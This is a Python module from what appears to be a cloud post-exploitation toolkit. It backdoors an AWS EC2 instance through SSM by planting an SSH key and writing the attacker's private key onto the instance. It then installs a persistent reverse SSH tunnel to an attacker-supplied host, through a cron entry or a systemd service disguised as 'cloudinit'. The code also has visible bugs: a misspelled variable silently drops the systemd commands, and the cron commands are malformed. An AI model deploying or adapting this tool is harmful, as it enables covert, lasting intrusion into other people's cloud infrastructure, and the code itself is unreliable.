import argparse
import boto3
import json

from .DoorModule import DoorModule
import time
import base64

class EC2Socks(DoorModule):
    class Meta:
        name = 'AWS EC2 Socks'
        help = 'Connect to EC2 through SSM and create a reverse socks'

    def __init__(self, argv:list[str]):
        parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
        parser.add_argument(
            '-n',
            '--name',
            help='The EC2 instance id to backdoor',
            required=True
        )
        parser.add_argument(
            '-k',
            '--key',
            help='The SSH public key to connect to the EC2',
            required=True
        )
        parser.add_argument(
            '-rk',
            '--reversekey',
            help='The SSH key file to connect back to the attacker machine',
            default=None,
            required=True
        )
        parser.add_argument(
            '-u',
            '--user',
            help='The user to add the SSH key to',
            default='ssm-user',
            required=False
        )
        parser.add_argument(
            '-sp',
            '--socksport',
            help='The port where the reverse socks will be open',
            default='4444',
            required=False
        )
        parser.add_argument(
            '-su',
            '--sshuser',
            help='The ssh user used for the reverse SSH connection',
            required=True
        )
        parser.add_argument(
            '-sh',
            '--sshhost',
            help='The IP address of the host used for the reverse SSH connection',
            required=True
        )
        parser.add_argument(
            '--method',
            choices=('cron', 'systemd'),
            help='The method to use for persistence crontab, systemd service, ...',
            default='systemd',
            required=False
        )

        args, _ = parser.parse_known_args(argv)
        self.name = args.name
        self.key = args.key
        with open(args.reversekey, 'rb') as f:
            self.reverse_key = base64.b64encode(f.read()).decode()
        self.user = args.user
        self.ruser = args.sshuser
        self.rhost = args.sshhost
        self.sport = args.socksport
        self.method = args.method

    def run(self):
        service = f'''
[Unit]
Description=Starting EC2 process
After=network.target
Wants=network-online.target
 
[Service]
ExecStart=/usr/bin/ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R {self.sport}:127.0.0.1:22 {self.ruser}@{self.rhost} -i /home/{self.user}/.ssh/cloudinit.pem -N
Restart=always
RestartSec=5
User={self.user}
WorkingDirectory=/home/{self.user}
 
[Install]
WantedBy=multi-user.target
        '''
        ssm = boto3.client('ssm')
        persitence = []
        if self.method == 'cron':
            persitence = [
                f'(crontab - l; echo "@reboot /usr/bin/ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R {self.sport}:127.0.0.1:22 {self.ruser}@{self.rhost} -i /home/{self.user}/.ssh/cloudinit.pem -N -f") | sort - u | crontab -'
                f'nohup /usr/bin/ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R {self.sport}:127.0.0.1:22 {self.ruser}@{self.rhost} -i /home/{self.user}/.ssh/cloudinit.pem -N -f'
            ]
        elif self.method == 'systemd':
            persistence = [
                f'sudo echo {base64.b64encode(service.encode()).decode()} | base64 -d | tee -a /etc/systemd/system/cloudinit.service',
                f'sudo systemctl enable cloudinit.service',
                f'sudo systemctl start cloudinit'
            ]
        response = ssm.send_command(
            InstanceIds=[self.name],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [
                f'sudo mkdir -p /home/{self.user}/.ssh',
                f'sudo echo "{self.key}" | sudo tee -a /home/{self.user}/.ssh/authorized_keys',
                f'sudo echo "{self.reverse_key}" | base64 -d | sudo tee /home/{self.user}/.ssh/cloudinit.pem',
                f'sudo chmod 400 /home/{self.user}/.ssh/cloudinit.pem',
                f'sudo chown {self.user}:{self.user} /home/{self.user}/.ssh/cloudinit.pem',
                f'sudo chown {self.user}:{self.user} /home/{self.user}/.ssh/authorized_keys',
                *persitence,
            ]},
        )

        command_id = response['Command']['CommandId']
        print(f"[+] Command sent with ID: {command_id}")
        print(f"[-] Waiting 10 seconds for execution")
        time.sleep(10)

        output = ssm.get_command_invocation(
            CommandId=command_id,
            InstanceId=self.name
        )

        print("[+] Status:", output['Status'])
        print("[+] Output:\n", output['StandardOutputContent'])
        print("[+] Errors:\n", output['StandardErrorContent'])
